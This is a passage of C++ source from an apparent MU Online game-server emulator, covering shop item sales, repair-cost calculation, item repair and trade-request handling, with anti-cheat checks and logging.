	if ( lpMsg->Pos > ReadConfig.MAIN_INVENTORY_SIZE(aIndex,false)-1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		LogAdd(lMsg.Get(MSGGET(1, 227)), lpMsg->Pos);
		return;
	}

	if ( gObjCheckSerial0ItemList(&lpObj->pInventory[lpMsg->Pos]) != FALSE )
	{
		MsgOutput(aIndex, lMsg.Get(MSGGET(13, 26)));
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][Serial 0 Item] [Sell Item] (%s)(%s) Item(%s) Pos(%d)",
				lpObj->AccountID, lpObj->Name, lpObj->pInventory[lpMsg->Pos].GetName(), lpMsg->Pos);
		}

		return;
	}

	if ( lpObj->pInventory[lpMsg->Pos].m_Type == ITEMGET(14,11) ) // Box of Luck
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (( lpObj->pInventory[lpMsg->Pos].m_QuestItem != false) && (ReadConfig.CGSellRequestRecvQuestSell == 0))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpObj->pInventory[lpMsg->Pos].m_Type == ITEMGET(13,20) && lpObj->pInventory[lpMsg->Pos].m_Level == 1) // Wizards Ring +1
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpObj->pInventory[lpMsg->Pos].m_Type == ITEMGET(13,20) && lpObj->pInventory[lpMsg->Pos].m_Level == 2) // Wizards Ring +2
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpObj->pInventory[lpMsg->Pos].m_Type == ITEMGET(12,26) &&
		(lpObj->pInventory[lpMsg->Pos].m_Level == 1 ||
		 lpObj->pInventory[lpMsg->Pos].m_Level == 2 || 
		 lpObj->pInventory[lpMsg->Pos].m_Level == 3 || 
		 lpObj->pInventory[lpMsg->Pos].m_Level == 4 || 
		 lpObj->pInventory[lpMsg->Pos].m_Level == 5 ))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( g_kJewelOfHarmonySystem.IsStrengthenByJewelOfHarmony(&lpObj->pInventory[lpMsg->Pos]) == TRUE )
	{
		GCServerMsgStringSend(lMsg.Get(MSGGET(13, 37)), lpObj->m_Index, 1);
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (( SellItemResult(lpObj,lpMsg->Pos) == true ) && (ReadConfig.ItemSellLimit == 1))
	{
		GCServerMsgStringSend("You cant do that!",aIndex, 0x01);
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( IsCashItem(lpObj->pInventory[lpMsg->Pos].m_Type) == TRUE )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if(gObjInventorySearchSerialNumber(lpObj,lpObj->pInventory[lpMsg->Pos].GetNumber()) == 0)
	{
		return;
	}

	if ( lpObj->pInventory[lpMsg->Pos].m_Type == ITEMGET(14,12) && lpObj->pInventory[lpMsg->Pos].m_Level == 1) // Heart+1
	{
		pResult.Result = true;
		pResult.Money = lpObj->Money;
		gObjInventoryItemSet(aIndex, lpMsg->Pos, -1);
		lpObj->pInventory[lpMsg->Pos].Clear();
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		return;
	}
	if(lpMsg->Pos == 8)
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpObj->pInventory[lpMsg->Pos].IsItem() == FALSE )
	{
		pResult.Result = false;
		pResult.Money = lpObj->Money;
		LogAdd(lMsg.Get(MSGGET(1, 228)), __FILE__, __LINE__, lpObj->Name, lpMsg->Pos);
		LogAdd("ID:%s CharID:%s ", lpObj->AccountID, lpObj->Name);
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

	}
	else
	{
		BYTE NewOption[MAX_EXOPTION_SIZE];
		int iAddZen = 0;
		int type = lpObj->pInventory[lpMsg->Pos].m_Type;

		if ( type == ITEMGET(13,4) || type == ITEMGET(13,5)) // Pets
			lpObj->pInventory[lpMsg->Pos].PetValue();
		else
			lpObj->pInventory[lpMsg->Pos].Value();

		iAddZen = lpObj->pInventory[lpMsg->Pos].m_SellMoney;

		if(ReadConfig.UseChangeSellMoney == 1)
			if(iAddZen > ReadConfig.MaxSellMoney)
				iAddZen = ReadConfig.MaxSellMoney;

		/*if ( gObjCheckMaxZen(aIndex, iAddZen) == FALSE )
		{
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}*/

		__int64 tmpZen = (__int64)lpObj->Money + (__int64)iAddZen;
		if (tmpZen > MAX_ZEN)
		{
			lpObj->Money = MAX_ZEN;
		} else {
			lpObj->Money += iAddZen;
		}

		pResult.Result =true;
		pResult.Money = lpObj->Money;

		

		ItemIsBufExOption(NewOption, &lpObj->pInventory[lpMsg->Pos]);

		LogAddTD(lMsg.Get(MSGGET(1, 229)), lpObj->AccountID, lpObj->Name, tShop,
			iAddZen, lpObj->pInventory[lpMsg->Pos].GetName(), 
			lpObj->pInventory[lpMsg->Pos].m_Level, lpObj->pInventory[lpMsg->Pos].m_SkillOption,
			lpObj->pInventory[lpMsg->Pos].m_LuckOption, lpObj->pInventory[lpMsg->Pos].m_Z28Option,
			lpObj->pInventory[lpMsg->Pos].m_Number, (int)lpObj->pInventory[lpMsg->Pos].m_Durability,
			NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4], NewOption[5], NewOption[6], 
			lpObj->pInventory[lpMsg->Pos].m_SetOption);

		::gObjInventoryDeleteItem(aIndex, lpMsg->Pos);

		if ( lpMsg->Pos == 10 || lpMsg->Pos == 11 )
		{
			::gObjUseSkill.SkillChangeUse(aIndex);
		}

		::gObjMakePreviewCharSet(aIndex);
	}

	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}


int GetNeedMoneyItemDurRepaire(CItem *  DurItem, BOOL RequestPos, LPOBJ lpObj)
{
	int iMoney = 0;
	int type = DurItem->m_Type;
	float ItemDurability = DurItem->m_Durability;

	if ( type == ITEMGET(13,10) ) // Transformation Ring
		return 0;

	if ( ::HasItemDurability(type ) != FALSE )
	{
		float lc4;
		float lc5 = 0;
		lc4 = DurItem->m_BaseDurability;

		if ( ItemDurability == lc4 )
			return 0;

		float lc6 = 1.0f - ItemDurability / lc4;
		int lc7;

		if ( type == ITEMGET(13,4)|| type ==ITEMGET(13,5) ) // Pets
			lc7 = DurItem->m_BuyMoney;
		else
			lc7 = DurItem->m_BuyMoney/3;

		if ( lc7 > 400000000 ) lc7 = 400000000;

		if ( lc7 >= 1000 )
			lc7 = lc7/100*100;
		else if ( lc7 >= 100 )
			lc7 = lc7/10*10;

		float lc8 = sqrt((float)lc7);
		float lc9 = sqrt(sqrt((float)lc7)); 
		lc5 = 3.0f * lc8 * lc9;
		lc5 *= lc6;
		lc5 += 1.0f;

		if ( ItemDurability <= 0.0f )
		{
			if ( type == ITEMGET(13,4)|| type ==ITEMGET(13,5) ) // Pets
				lc5 *= 2;
			else
				lc5 *= ::GetAllRepairItemRate(type);

		}

		if ( RequestPos == TRUE )
		{
			lc5 += lc5 * 0.05f;
		}
		iMoney = lc5;

		if ( iMoney >= 1000 )
			iMoney = iMoney/100*100;
		else if ( iMoney >= 100 )	// Deathway fix Here -> Must be 100 and >=
			iMoney = iMoney/10*10;

		if (type >= 0 && type < 6144)//(Sets and Weapons)
		{
			if ( lpObj->Type == OBJ_USER )
			{
				if(ReadConfig.S6E2 == 0)
					iMoney = (int)(iMoney * ((100 - lpObj->MasterCharacterInfo->Repair[0])/100));
			}
		}
		else if( (type >= 6144 && type <= 6151) || (type >= 6180 && type <= 6187) || (type == 6664) || (type == 6665) || (type == 6668) || (type == 6669) || (type >= 6676 || type <= 6684) || (type == 6686))
		{
			//Rings/Pendants and Wings
			if ( lpObj->Type == OBJ_USER )	// Miss for Uses
			{
				if(ReadConfig.S6E2 == 0)
					iMoney = (int)(iMoney * ((100 - lpObj->MasterCharacterInfo->Repair[1])/100));
			}
		}
		
	}
	else
	{
		iMoney = -1;
	}

	return iMoney;
}




struct PMSG_ITEMDURREPAIR_RESULT
{
	PBMSG_HEAD h;	// C1:34
	int Money;	// 4
};



/*
void ItemDurRepaire(LPOBJ lpObj, CItem * DurItem, int pos, int RequestPos)
{
	if ( lpObj->Type != OBJ_USER )
		return;

	PMSG_ITEMDURREPAIR_RESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x34, sizeof(pResult));
	int itemtype = DurItem->m_Type;

	if ( lpObj->m_IfState.type != 13 )
	{
		if ( itemtype ==ITEMGET(13,4)  || itemtype == ITEMGET(13,5))
		{
			pResult.Money = 0;
			DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

			return;
		}
	}

	if ( itemtype >= ITEMGET(14,0) || 
		(itemtype >= ITEMGET(13,0) && itemtype < ITEMGET(13,4) ) || 
		itemtype == ITEMGET(13,64) || 
		itemtype == ITEMGET(13,65) || 
		itemtype == ITEMGET(13,67) ||	//Pet Rudolf
		itemtype == ITEMGET(13,80) ||	//Pet Panda
		itemtype == ITEMGET(13,106) ||	//Pet Unicorn
		itemtype == ITEMGET(13,123) ||	//Pet Skeleton
		itemtype == ITEMGET(13,76) || 
		itemtype == ITEMGET(13,122) || 
		itemtype == ITEMGET(13,10) || 
		(itemtype >= ITEMGET(12,7) && itemtype <ITEMGET(12,36) ) || 
		(itemtype >= ITEMGET(12,44) && itemtype <ITEMGET(12,49) ) ||
		(itemtype >= ITEMGET(12,51) && itemtype <ITEMGET(12,130) ) || 
#if (CRYSTAL_EDITION==1)
		(itemtype >= ITEMGET(12,136) && itemtype <ITEMGET(12,200) ) || 
		(itemtype >= ITEMGET(12,255) && itemtype <ITEMGET(13,0) ) || 
#else
		(itemtype >= ITEMGET(12,136) && itemtype <ITEMGET(13,0) ) || 
#endif
		itemtype ==ITEMGET(4,7) || 
		itemtype ==ITEMGET(4,15) || 
		itemtype ==ITEMGET(13,40) || 
		itemtype ==ITEMGET(13,41)  
		)
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

		return;
	}

	if ( itemtype == ITEMGET(13,38) )
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

		return;
	}

	if ( itemtype == ITEMGET(13,39) )
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

		return;
	}

	if ( itemtype == ITEMGET(13,40) )
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

		return;
	}

	if ( itemtype == ITEMGET(13,41) )
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

		return;
	}

	pResult.Money = GetNeedMoneyItemDurRepaire(DurItem, RequestPos, lpObj);

	BOOL isMasterRepair = FALSE;

	if ( pResult.Money <= 0 )
	{
		if(lpObj->MasterCharacterInfo->Repair[0] <= 0 && lpObj->MasterCharacterInfo->Repair[1] <= 0 && ReadConfig.S6E2 == 0)
		{
			pResult.Money = 0;
			DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

			return;
		}
		pResult.Money = 0;
		isMasterRepair = TRUE;
	}

	if (( (lpObj->Money - pResult.Money) < 1 ) && (isMasterRepair == FALSE))
		pResult.Money = 0;
	else
	{
		lpObj->Money -= pResult.Money;
		pResult.Money = lpObj->Money;
		DurItem->m_Durability = (float)((int)DurItem->m_BaseDurability);
		DurItem->Convert(DurItem->m_Type, DurItem->m_SkillOption, DurItem->m_LuckOption, DurItem->m_Z28Option,
			DurItem->m_NewOption, DurItem->m_SetOption,DurItem->m_ItemOptionEx, CURRENT_DB_VERSION);
		GCItemDurSend(lpObj->m_Index, pos, DurItem->m_Durability, FALSE);
	}

	DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
}
*/

void ItemDurRepaire(LPOBJ lpObj, CItem * DurItem, int pos, int RequestPos)
{
	if ( lpObj->Type != OBJ_USER )
		return;

	PMSG_ITEMDURREPAIR_RESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x34, sizeof(pResult));
	int itemtype = DurItem->m_Type;

	if ( lpObj->m_IfState.type != 13 )
	{
		if (itemtype ==ITEMGET(13,4) || //Dark Horse
			itemtype == ITEMGET(13,5))	//Dark Raven
		{
			pResult.Money = 0;
			DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}

	if ( itemtype >= ITEMGET(14,0) || //Apple
		(itemtype >= ITEMGET(12,7) && itemtype <ITEMGET(12,36) ) || 
		(itemtype >= ITEMGET(12,44) && itemtype <ITEMGET(12,49) ) ||
		(itemtype >= ITEMGET(12,51) && itemtype <ITEMGET(12,130) ) || 
#if (CRYSTAL_EDITION==1)
		(itemtype >= ITEMGET(12,136) && itemtype <ITEMGET(12,200) ) || 
		(itemtype >= ITEMGET(12,255) && itemtype <ITEMGET(13,0) ) || 
#else
		(itemtype >= ITEMGET(12,136) && itemtype <ITEMGET(13,0) ) || 
#endif
		itemtype == ITEMGET(4,7) ||		//Bolts
		itemtype == ITEMGET(4,15) ||	//Arrows

		itemtype == ITEMGET(13,0) ||	//Guardian Angel
		itemtype == ITEMGET(13,1) ||	//Satan
		itemtype == ITEMGET(13,2) ||	//Horn of Unicorn
		itemtype == ITEMGET(13,3) ||	//Horn of Dinorant
		itemtype == ITEMGET(13,10) ||	//Ring of Transformation

		itemtype == ITEMGET(13,38) ||	//Moonstone Pendant
		itemtype == ITEMGET(13,39) ||	//Ring 
		itemtype == ITEMGET(13,40) ||	//Ring 
		itemtype == ITEMGET(13,41) ||	//Ring Of Santa Girl
		itemtype == ITEMGET(13,46) ||	//Devil Square free admission
		itemtype == ITEMGET(13,47) ||	//Blood Castle free tickets
		itemtype == ITEMGET(13,48) ||	//Kalima Ticket free tickets

		itemtype == ITEMGET(13,61) ||	//Illusion Temple Ticket
		itemtype == ITEMGET(13,64) ||	//Demon
		itemtype == ITEMGET(13,65) ||	//Spirit of Guardian
		itemtype == ITEMGET(13,66) ||	//Invitation to Santa Village
		itemtype == ITEMGET(13,67) ||	//Pet Rudolf
		itemtype == ITEMGET(13,68) ||	//Snowman Transformation Ring

		itemtype == ITEMGET(13,69) ||	//Talisman of Resurrection
		itemtype == ITEMGET(13,70) ||	//Talisman of Mobility

		itemtype == ITEMGET(13,76) ||	//Panda Ring
		itemtype == ITEMGET(13,80) ||	//Pet Panda
		itemtype == ITEMGET(13,103) ||	//Party EXP Scroll
		itemtype == ITEMGET(13,106) ||	//Pet Unicorn

		itemtype >= ITEMGET(13,117)		//Minimum Vitality Potion
		)
		//All below items should not repair either, so i set all to not repairable
		//itemtype == ITEMGET(13,118) ||	//Low Vitality Potion
		//itemtype == ITEMGET(13,119) ||	//Medium Vitality Potion
		//itemtype == ITEMGET(13,120) ||	//High Vitality Potion
		//itemtype == ITEMGET(13,121) ||	//Open Access Ticket to Chaos
		//itemtype == ITEMGET(13,122) ||	//Skeleton Transformation Ring
		//itemtype == ITEMGET(13,123) ||	//Pet Skeleton
		//itemtype == ITEMGET(13,125) ||	//Open Access Ticket to Doppel
		//itemtype == ITEMGET(13,126) ||	//Open Access Ticket to Varka
		//itemtype == ITEMGET(13,127) ||	//Open Access Ticket to Varkama
		//itemtype == ITEMGET(13,254)		//Not Used
		//)
	{
		pResult.Money = 0;
		DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	BOOL isMasterRepair = FALSE;
	pResult.Money = GetNeedMoneyItemDurRepaire(DurItem, RequestPos, lpObj);

	if ( pResult.Money <= 0 )
	{
		if(lpObj->MasterCharacterInfo->Repair[0] <= 0 && lpObj->MasterCharacterInfo->Repair[1] <= 0 && ReadConfig.S6E2 == 0)
		{
			pResult.Money = 0;
			DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);

			return;
		}
		pResult.Money = 0;
		isMasterRepair = TRUE;
	}

	if (( (lpObj->Money - pResult.Money) < 1 ) && (isMasterRepair == FALSE))
	{
		pResult.Money = 0;
	}
	else
	{
		lpObj->Money -= pResult.Money;
		pResult.Money = lpObj->Money;
		DurItem->m_Durability = (float)((int)DurItem->m_BaseDurability);
		DurItem->Convert(DurItem->m_Type, DurItem->m_SkillOption, DurItem->m_LuckOption, DurItem->m_Z28Option,
			DurItem->m_NewOption, DurItem->m_SetOption,DurItem->m_ItemOptionEx, CURRENT_DB_VERSION);
		GCItemDurSend(lpObj->m_Index, pos, DurItem->m_Durability, FALSE);
	}

	DataSend(lpObj->m_Index, (LPBYTE)&pResult, pResult.h.size);
}



void CGModifyRequestItem(PMSG_ITEMDURREPAIR * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	PMSG_ITEMDURREPAIR_RESULT pResult;

	PHeadSetB((LPBYTE)&pResult, 0x34, sizeof(pResult));
	pResult.Money = 0;


	if ( gObj[aIndex].CloseType != -1 )
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( !PacketCheckTime(lpObj))
	{
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if (lpMsg->Requestpos == 1 && gObj[aIndex].Level < 50 )
	{
		pResult.Money = 0;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( lpMsg->Position == 0xFF )
	{
		for ( int n=0;n<ReadConfig.MAIN_INVENTORY_SIZE(lpObj->m_Index,false);n++)
		{
			if ( lpObj->pInventory[n].IsItem())
			{
				if ( IsCashItem(lpObj->pInventory[n].m_Type ) == TRUE )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,20) && (lpObj->pInventory[n].m_Level == 0 ||lpObj->pInventory[n].m_Level == 1 ))
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,20) && lpObj->pInventory[n].m_Level == 2 )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,107) )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,4) || lpObj->pInventory[n].m_Type == ITEMGET(13,5) )
					continue;
				
				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,37) )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,38) )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,39) )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,32) )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(13,33) )
					continue;

				if ( lpObj->pInventory[n].m_Type == ITEMGET(12,26) &&
					(lpObj->pInventory[n].m_Level == 1 ||
					 lpObj->pInventory[n].m_Level == 2 || 
					 lpObj->pInventory[n].m_Level == 3 || 
					 lpObj->pInventory[n].m_Level == 4 || 
					 lpObj->pInventory[n].m_Level == 5 ))
					 continue;

				if ((lpObj->pInventory[n].GetNumber() == 0xFFFFFFFF && ReadConfig.BlockFFFFFFFFSerialRepair == TRUE) ||
					(lpObj->pInventory[n].GetNumber() == 0xFFFFFFFE && ReadConfig.BlockFFFFFFFESerialRepair == TRUE) ||
					(lpObj->pInventory[n].GetNumber() == 0xFFFFFFFD && ReadConfig.BlockFFFFFFFDSerialRepair == TRUE) ||
					(lpObj->pInventory[n].GetNumber() == 0xFFFFFFFC && ReadConfig.BlockFFFFFFFCSerialRepair == TRUE) )
				{
					GCServerMsgStringSend("Can Not Repair Promo Item!", lpObj->m_Index, 1);
					continue;
				}

				//Sacred Lucky Items
				if ( lpObj->pInventory[n].m_Type >= ITEMGET(7,62) && lpObj->pInventory[n].m_Type <= ITEMGET(7,72) )
					continue;
				if ( lpObj->pInventory[n].m_Type >= ITEMGET(8,62) && lpObj->pInventory[n].m_Type <= ITEMGET(8,72) )
					continue;
				if ( lpObj->pInventory[n].m_Type >= ITEMGET(9,62) && lpObj->pInventory[n].m_Type <= ITEMGET(9,72) )
					continue;
				if ( lpObj->pInventory[n].m_Type >= ITEMGET(10,62) && lpObj->pInventory[n].m_Type <= ITEMGET(10,72) )
					continue;
				if ( lpObj->pInventory[n].m_Type >= ITEMGET(11,62) && lpObj->pInventory[n].m_Type <= ITEMGET(11,72) )
					continue;

				ItemDurRepaire(lpObj,&lpObj->pInventory[n] , n, lpMsg->Requestpos);
			}
		}

		gObjCalCharacter(lpObj->m_Index);
		return;
	}

	if ( lpMsg->Position > ReadConfig.MAIN_INVENTORY_SIZE(lpObj->m_Index,false)-1)
	{
		pResult.Money = 0;
		return;
	}

	if ( IsCashItem(lpObj->pInventory[lpMsg->Position].m_Type ) == TRUE )
		return;

	if ( lpObj->pInventory[lpMsg->Position].m_Type == ITEMGET(13,20) && (lpObj->pInventory[lpMsg->Position].m_Level == 0 ||lpObj->pInventory[lpMsg->Position].m_Level == 1 ))
		return;

	if ( lpObj->pInventory[lpMsg->Position].m_Type == ITEMGET(13,20) && lpObj->pInventory[lpMsg->Position].m_Level == 2 )
		return;

	if ( lpObj->pInventory[lpMsg->Position].m_Type == ITEMGET(13,107) )
		return;

	if ( lpObj->pInventory[lpMsg->Position].m_Type == ITEMGET(13,37) )
		return;

	if ( lpObj->pInventory[lpMsg->Position].m_Type == ITEMGET(13,38) )
		return;

	//Sacred Lucky Items
	if ( lpObj->pInventory[lpMsg->Position].m_Type >= ITEMGET(7,62) && lpObj->pInventory[lpMsg->Position].m_Type <= ITEMGET(7,72) )
		return;
	if ( lpObj->pInventory[lpMsg->Position].m_Type >= ITEMGET(8,62) && lpObj->pInventory[lpMsg->Position].m_Type <= ITEMGET(8,72) )
		return;
	if ( lpObj->pInventory[lpMsg->Position].m_Type >= ITEMGET(9,62) && lpObj->pInventory[lpMsg->Position].m_Type <= ITEMGET(9,72) )
		return;
	if ( lpObj->pInventory[lpMsg->Position].m_Type >= ITEMGET(10,62) && lpObj->pInventory[lpMsg->Position].m_Type <= ITEMGET(10,72) )
		return;
	if ( lpObj->pInventory[lpMsg->Position].m_Type >= ITEMGET(11,62) && lpObj->pInventory[lpMsg->Position].m_Type <= ITEMGET(11,72) )
		return;

	if ((lpObj->pInventory[lpMsg->Position].GetNumber() == 0xFFFFFFFF && ReadConfig.BlockFFFFFFFFSerialRepair == TRUE) ||
		(lpObj->pInventory[lpMsg->Position].GetNumber() == 0xFFFFFFFE && ReadConfig.BlockFFFFFFFESerialRepair == TRUE) ||
		(lpObj->pInventory[lpMsg->Position].GetNumber() == 0xFFFFFFFD && ReadConfig.BlockFFFFFFFDSerialRepair == TRUE) ||
		(lpObj->pInventory[lpMsg->Position].GetNumber() == 0xFFFFFFFC && ReadConfig.BlockFFFFFFFCSerialRepair == TRUE) )
	{
		GCServerMsgStringSend("Can Not Repair Promo Item!", lpObj->m_Index, 1);
		return;
	}

	ItemDurRepaire(lpObj, &lpObj->pInventory[lpMsg->Position], lpMsg->Position, lpMsg->Requestpos);
	gObjCalCharacter(lpObj->m_Index);
}





struct PMSG_TRADE_REQUESTSEND
{
	PBMSG_HEAD h;	// C3:36
	char szId[10];	// 3
};



void CGTradeRequestSend(PMSG_TRADE_REQUEST * lpMsg, int aIndex)
{
	int number;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if (bCanTrade == FALSE )
	{
		::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 125)), aIndex, 1);
		::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 126)), aIndex, 1);
		return;
	}

#if (PACK_EDITION>=2)
	if(HalloweenEvent.Enabled == 1 && HalloweenEvent.Start == true && HalloweenEvent.CheckMap(gObj[aIndex].MapNumber) == true)
	{
		GCServerMsgStringSend("Can Not trade during Halloween event!", aIndex, 1);
		return;
	}
#endif

	if ( gObj[aIndex].CloseType != -1 )
		return;

	LPOBJ lpObj = &gObj[aIndex];

	if ( !PacketCheckTime(lpObj))
		return;

	number = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

	if ( OBJMAX_RANGE(number) == FALSE )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("Error : %s %d (%d)", __FILE__, __LINE__, number);
		//LogAdd("Error : %s %d (%d)", __FILE__, __LINE__, number);
		return;
	}

	if ( number == aIndex )
		return;

	
#if (PACK_EDITION>=3)
	if(BotWarper.TradeOpen(aIndex,number) == 1)
		return;
	if(BotReward.TradeOpen(aIndex,number) == 1)
		return;
	if(BotRacer.TradeOpen(aIndex,number) == 1)
		return;
	if(BotBuff.TradeOpen(aIndex,number) == 1)
		return;
	if(BotAlchemist.TradeOpen(aIndex,number) == 1)
		return;
	if(BotTrader.TradeOpen(aIndex,number) == 1)
		return;
	#if (CRYSTAL_EDITION==1)	
		if(BotVipShop.TradeOpen(aIndex,number) == 1)
			return;
	#endif
		if(BotHider.TradeOpen(aIndex,number) == 1)
			return;
#endif

	if(!(number >= OBJ_STARTUSERINDEX && number < OBJMAX))
	{		
		return;
	}

	if ( !gObjIsConnected(number))
		return;

	if ( gObj[number].Type == OBJ_MONSTER )
	{
#if (PACK_EDITION>=3)
		if(gObj[number].IsBot == 1)
		{
			int player = gObj[number].BotNumOwner;
			if ( OBJMAX_RANGE(player) == TRUE )
			{
				if(gObjIsConnected(player))
				{
					char sbuf[512]={0};
					wsprintf(sbuf,"Ask my master %s",gObj[player].Name);
					ChatSend(&gObj[number], sbuf);
				}
			}
		}
#endif
		return;
	}

	if ( gObj[number].CloseCount >= 0 )
		return;

	if ( gObj[number].m_bMapSvrMoveQuit == true || gObj[number].m_bMapAntiHackMove == true )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][TradeRequest] - Trade during MapServer Move [%s][%s]",
				gObj[number].AccountID, gObj[number].Name);
		}

		return;
	}

	if ( DS_MAP_RANGE(gObj[number].MapNumber) != FALSE )
	{
		::GCServerMsgStringSend(lMsg.Get(MSGGET(2, 199)), aIndex, 1);
		return;
	}

	if ( gObj[aIndex].m_bPShopOpen == true )
		return;

	if ( gObj[number].m_bPShopOpen == true )
		return;
//DUEL FIX

	if (gObj[number].m_isDuelSpectator == true)
		return;

	if (gObj[aIndex].m_isDuelSpectator == true)
		return;

//DUEL FIX
	if ( CC_MAP_RANGE(gObj[number].MapNumber) != FALSE )
	{
		::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 196)), aIndex, 1);
		return;
	}

	if ( BC_MAP_RANGE(gObj[aIndex].MapNumber) != FALSE )
	{
		int BCRest = MAP_INDEX_BLOODCASTLE1;
		if(gObj[aIndex].MapNumber == MAP_INDEX_BLOODCASTLE8)
		{
			BCRest = 45;
		}
		if ( g_BloodCastle.GetCurrentState(gObj[aIndex].MapNumber-BCRest) != 1 || g_BloodCastle.CheckCanEnter(gObj[aIndex].MapNumber-BCRest) == false )
		{
			::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 188)), aIndex, 1);
			return;
		}	
	}

	if ( (gObj[number].m_Option &1) != 1 )
	{
		::GCTradeResponseSend(0, aIndex, gObj[number].Name, 0, 0);
		return;
	}

	if ( lpObj->m_IfState.use > 0 )
	{
		::GCTradeResponseSend(3, aIndex, gObj[number].Name, 0, 0);
		return;
	}

	if (gObj[number].m_IfState.use > 0 )
	{
		::GCTradeResponseSend(2, aIndex, gObj[number].Name, 0, 0);
		return;
	}

	if ( ::gObjFixInventoryPointer(aIndex) == false )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
		//LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}

	if ( gObj[aIndex].pTransaction == 1 )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("[%s][%s] CGTradeRequestSend() Failed : Transaction == 1, IF_TYPE : %d",
		//LogAddTD("[%s][%s] CGTradeRequestSend() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);

		return;
	}

	lpObj->m_IfState.use = 1;
	lpObj->m_IfState.state = 0;
	lpObj->m_IfState.type = 1;
	lpObj->TargetNumber = number;
	gObj[number].m_IfState.use = 1;
	gObj[number].m_IfState.state = 0;
	gObj[number].m_IfState.type = 1;
	gObj[number].TargetNumber = aIndex;
	lpObj->m_InterfaceTime = GetTickCount();
	gObj[number].m_InterfaceTime = GetTickCount();

	PMSG_TRADE_REQUESTSEND pMsg;

	pMsg.h.c = 0xC3;
	pMsg.h.headcode = 0x36;
	pMsg.h.size = sizeof(pMsg);
	memcpy(pMsg.szId, gObj[aIndex].Name, sizeof(pMsg.szId));

	DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);

	if(ReadConfig.TradeLog == TRUE)
		TRADE_LOG.Output(lMsg.Get(MSGGET(1, 230)), 
		//LogAddTD(lMsg.Get(MSGGET(1, 230)), 
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Ip_addr,
			gObj[number].AccountID, gObj[number].Name, gObj[number].Ip_addr);
}




void CGTradeResponseRecv(PMSG_TRADE_RESPONSE * lpMsg, int aIndex)
{
	BOOL Result = TRUE;
	int number = gObj[aIndex].TargetNumber;

	if ( OBJMAX_RANGE(aIndex) == FALSE )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("error-L1 : %d (A_ID:%s) %s %d", 
			//LogAdd("error-L1 : %d (A_ID:%s) %s %d", 
